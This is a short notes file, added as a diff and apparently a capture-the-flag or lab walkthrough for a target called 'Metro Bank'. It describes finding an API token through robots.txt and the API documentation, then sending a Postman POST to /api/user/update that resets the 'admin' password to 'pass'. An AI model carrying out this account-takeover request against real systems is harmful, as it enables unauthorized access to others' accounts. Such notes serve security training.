@@ -1,0 +1,18 @@
+Metro Bank:
+
+Go to robots.txt
+
+go to the api documentation
+
+Get the AppToken header
+
+Use Postman:
+
+Send post request to  /api/user/update
+
+Add header:
+	AppToken: [token]
+	
+Body:
+	Raw (JSON)
+{ "user" : "admin", "update" : { "password" : "pass" } }
